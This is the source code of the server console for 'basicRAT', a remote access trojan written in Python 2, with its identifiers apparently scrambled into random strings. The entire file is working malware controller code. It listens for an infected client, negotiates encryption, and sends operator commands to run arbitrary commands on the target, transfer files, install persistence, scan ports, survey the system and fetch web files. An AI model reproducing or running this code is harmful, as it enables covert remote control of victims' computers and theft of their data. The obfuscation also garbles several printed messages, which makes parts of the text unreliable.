#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import XqHWrremwBFsMYrDDXfxsCwsOQaHkIuZ,tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc,cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc
    from core.filesock import oObhPcBxCTMcssEIlptmwgzCPHPiFSKF, zNAZkysAqusNrAkwvlbriurTqUjGQrDM
except ImportError as iHdzDbEPxnIlhaVzeHKFKxiPfLAsnrBo:
    print iHdzDbEPxnIlhaVzeHKFKxiPfLAsnrBo
    sys.exit(0)
cfiABtRSKWqOoLWvymjSJEebpeRZgtve = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
RrLKpBtsCvUfcoPaEnETOMauExCapGoJ = '''
______           _     ______  ___ _____   _            _   
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |  
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_ 
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_ 
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
                                                            
'''
oqlvHjcfjdGQxeZgmBIwqalxPNBRNbcY = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def BgtMozwaqfBjfkSaiVvXLGtOobUnEIWM():
    toZXktgXynaUNXzrXEAWzStwWzEDVSBl = argparse.ArgumentParser(description='basicRAT server')
    toZXktgXynaUNXzrXEAWzStwWzEDVSBl.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return toZXktgXynaUNXzrXEAWzStwWzEDVSBl
def rnPzBFRNluoIbLWxfabFISenRvvykfNm():
    toZXktgXynaUNXzrXEAWzStwWzEDVSBl  = BgtMozwaqfBjfkSaiVvXLGtOobUnEIWM()
    lPCtwajiFiBTLzwsHiQpKAirQaolkdeI    = vars(toZXktgXynaUNXzrXEAWzStwWzEDVSBl.parse_args())
    aLOFHrHnbpFZXQiparwOyAhXeCGkzymP    = lPCtwajiFiBTLzwsHiQpKAirQaolkdeI['port']
    KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.bind(('0.0.0.0', aLOFHrHnbpFZXQiparwOyAhXeCGkzymP))
    except socket.error:
        print 'Error: Unable to start server, aLOFHrHnbpFZXQiparwOyAhXeCGkzymP {} in use?'.format(aLOFHrHnbpFZXQiparwOyAhXeCGkzymP)
        sys.exit(1)
    for TzshynzvVOXFqCkYULLuNinTAWAbNgdO in RrLKpBtsCvUfcoPaEnETOMauExCapGoJ.split('\n'):
        time.sleep(0.05)
        print TzshynzvVOXFqCkYULLuNinTAWAbNgdO
    print 'basicRAT server listening on aLOFHrHnbpFZXQiparwOyAhXeCGkzymP {}...'.format(aLOFHrHnbpFZXQiparwOyAhXeCGkzymP)
    KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.listen(10)
    pIEqISsvZUMspmyweQDBmbhwyZzwlhbi, oGkQAlRPNtpKuOUoajJPbgnjBHeCPIXu = KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.accept()
    kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU = cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc(pIEqISsvZUMspmyweQDBmbhwyZzwlhbi, server=True)
    while True:
        KstoBbjTFHlinqlaQvlWQgbOZQlUArpT = raw_input('\n[{}] basicRAT> '.format(oGkQAlRPNtpKuOUoajJPbgnjBHeCPIXu[0])).rstrip()
        if not KstoBbjTFHlinqlaQvlWQgbOZQlUArpT:
            continue
        tYprDeVpyzkXPpgOohflUzwikfxRRfbI, _, action = KstoBbjTFHlinqlaQvlWQgbOZQlUArpT.partition(' ')
        if tYprDeVpyzkXPpgOohflUzwikfxRRfbI not in oqlvHjcfjdGQxeZgmBIwqalxPNBRNbcY:
            print 'Invalid command, type "help" to see XbkhMKCsiBtjmwojzluyxMVqLmBmgjzX list of commands.'
            continue
        if tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'help':
            print cfiABtRSKWqOoLWvymjSJEebpeRZgtve
            continue
        pIEqISsvZUMspmyweQDBmbhwyZzwlhbi.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(KstoBbjTFHlinqlaQvlWQgbOZQlUArpT, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        if tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'quit':
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.close()
            sys.exit(0)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'run':
            fmvryxbWHCWlTscJOtKqAQYERTDUMaOm = pIEqISsvZUMspmyweQDBmbhwyZzwlhbi.recv(4096)
            print XqHWrremwBFsMYrDDXfxsCwsOQaHkIuZ(fmvryxbWHCWlTscJOtKqAQYERTDUMaOm, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU).rstrip()
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'download':
            for zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM in action.split():
                zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM = zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM.strip()
                oObhPcBxCTMcssEIlptmwgzCPHPiFSKF(pIEqISsvZUMspmyweQDBmbhwyZzwlhbi, zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'upload':
            for zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM in action.split():
                zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM = zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM.strip()
                zNAZkysAqusNrAkwvlbriurTqUjGQrDM(pIEqISsvZUMspmyweQDBmbhwyZzwlhbi, zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'rekey':
            kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU = cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc(pIEqISsvZUMspmyweQDBmbhwyZzwlhbi, server=True)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(tYprDeVpyzkXPpgOohflUzwikfxRRfbI)
            fmvryxbWHCWlTscJOtKqAQYERTDUMaOm = pIEqISsvZUMspmyweQDBmbhwyZzwlhbi.recv(1024)
            print XqHWrremwBFsMYrDDXfxsCwsOQaHkIuZ(fmvryxbWHCWlTscJOtKqAQYERTDUMaOm, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
if __name__ == '__main__':
    rnPzBFRNluoIbLWxfabFISenRvvykfNm()
